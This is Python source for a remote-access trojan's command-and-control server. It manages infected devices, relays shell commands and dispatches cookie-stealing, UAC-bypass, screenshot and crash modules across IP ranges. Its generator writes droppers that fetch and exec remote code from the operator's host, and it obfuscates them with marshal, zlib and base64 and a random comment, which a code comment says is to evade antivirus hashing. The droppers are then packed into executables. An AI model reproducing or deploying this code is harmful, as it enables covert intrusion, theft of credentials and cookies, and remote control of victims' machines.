import json
import os
import subprocess
import platform
import base64
import zlib
import marshal
import uuid
import shutil
import datetime
import itertools

class C2:
    def __init__(self, sio):
        self.sio = sio
        self.devices = {}
        self.total_devices = {}
        with open("clients.json", 'r') as f:
            self.total_devices = json.load(f)
        for device in self.total_devices:
            self.total_devices[device]['status'] = 'Offline'
        self.sio.on('mConnect', self.on_connect)
        self.sio.on('disconnect', self.on_disconect)
        self.sio.on('command', self.send_command)
        self.sio.on('result', self.get_result)


    def on_connect(self, sid, data):
        print(f"New device connected with sid {sid}")
        if data['uuid'] not in self.devices:
            data['sid'] = sid
            self.devices.update({data['uuid']: data})
            self.total_devices.update({data['uuid']: data})

        self.update_json()


    def on_disconect(self, sid):
        print(f"Device disconnected with sid {sid}")
        for device in self.devices:
            if sid == self.devices[device]["sid"]:
                self.devices.pop(device)
                break
        self.update_json()

    def list_devices(self):
        return self.devices

    def delete_device(self, device_id):
        self.total_devices.pop(device_id)
        if device_id in self.devices:
            self.devices.pop(device_id)

        self.update_json()

    def list_all_devices(self):
        return self.total_devices


    def send_command(self, sid, data):
        self.sio.emit('command', {"id": data['id'], 'cmd': data['cmd']})

    def get_result(self, sid, data):
        for device in self.devices:
            if self.devices[device]['sid'] == sid:
                self.sio.emit('result', {"id": device, 'result': data})
                break

    def ctrl(self, data):
        self.sio.emit('restart', data)

    def update_json(self):
        for device in self.total_devices:
            if device not in self.devices:
                self.total_devices[device]['status'] = 'Offline'
            else:
                self.total_devices[device]['status'] = 'Online'
                
        with open("clients.json", "w") as f:
            json.dump(self.total_devices, f)


    def parce_ip(self, ip_range):
        ip_addresses = []

        if "-" in ip_range:
            sections = ip_range.split('.')

            # For each section, handle the range if it exists
            parsed_sections = []
            for section in sections:
                if '-' in section:
                    start, end = map(int, section.split('-'))
                    parsed_sections.append(range(start, end + 1))
                else:
                    parsed_sections.append([int(section)])

            # Generate all combinations of the sections
            all_ips = list(itertools.product(*parsed_sections))

            # Convert the combinations to IP address strings
            ip_addresses = ['.'.join(map(str, ip)) for ip in all_ips]
                
        else:
            ip_addresses.append(ip_range)

        return ip_addresses

    def explotation_module(self, data):
        explotation_module_type = data['explotation_module']
        ip_range = data['ip']

        ip_addresses = self.parce_ip(ip_range)

        if explotation_module_type == "steal-cookie":
            for ip in ip_addresses:
                self.sio.emit('steal-cookie', {"ip": ip})
            
        if explotation_module_type == "bsod":
            for ip in ip_addresses:
                self.sio.emit('bsod', {"ip": ip})
        
        if explotation_module_type == "screen-shot":
            for ip in ip_addresses:
                self.sio.emit('screen-shot', {"ip": ip})
        
        if explotation_module_type == "uac-bypass":
            for ip in ip_addresses:
                self.sio.emit('uac-bypass', {"ip": ip})
        
        if explotation_module_type == "send-command":
            for ip in ip_addresses:
                self.sio.emit('send-command', {"ip": ip})


    def generate(self, generate):
        os_name = generate['os']
        arch = generate['arch']
        url = generate['ip']
        print(url)
        
        if not os.path.isdir('payloads'):
            os.makedirs('payloads')


        payload = f"""url = "{url}"
def create_moduel(url):
  code = urlopen(url).read().decode('utf-8')
  spec = importlib.util.spec_from_loader('temp', loader=None)
  module = importlib.util.module_from_spec(spec)

  # execute the code in the temporary module
  exec(code, module.__dict__)

  return module
create_moduel(url+"client.py").run(url)"""
            
        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
from urllib.request import urlopen
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
#{uuid.uuid4()}"""
        #this will prevent anti-viruses from looking for hashes of the script
        
        system = platform.system()
        date = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%S.f%z')
        
        payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"

        with open(f"{payload_file_name}.py", 'w') as f:
            f.writelines(dropper)
        

        if os_name == "Windows":
            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
            print(result)
            shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")

        elif os_name == "Darwin" or "Linux":
            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
            print(result)
            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")

        os.remove(f"{payload_file_name}.py")
        os.remove(f"{payload_file_name}.spec")


    


    def send_file(data):
        ip_range = data['ip']
        ip_addresses = self.parce_ip(ip_range)


